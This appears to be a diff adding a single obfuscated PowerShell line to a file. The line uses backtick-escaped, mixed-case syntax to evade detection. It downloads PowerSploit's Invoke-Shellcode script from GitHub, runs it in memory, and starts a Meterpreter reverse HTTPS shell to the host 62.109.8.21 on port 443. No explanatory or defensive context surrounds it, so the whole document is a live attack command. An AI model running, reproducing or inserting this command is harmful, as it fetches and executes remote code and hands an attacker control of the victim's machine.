@@ -1,0 +1,1 @@
+﻿i`ex (nEW-`ObJ`E`ct Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); InV`OK`E`-sHeLLcO`dE -Payload windows/meterpreter/reverse_https -Lhost 62.109.8.21 -Lport 443 -Force
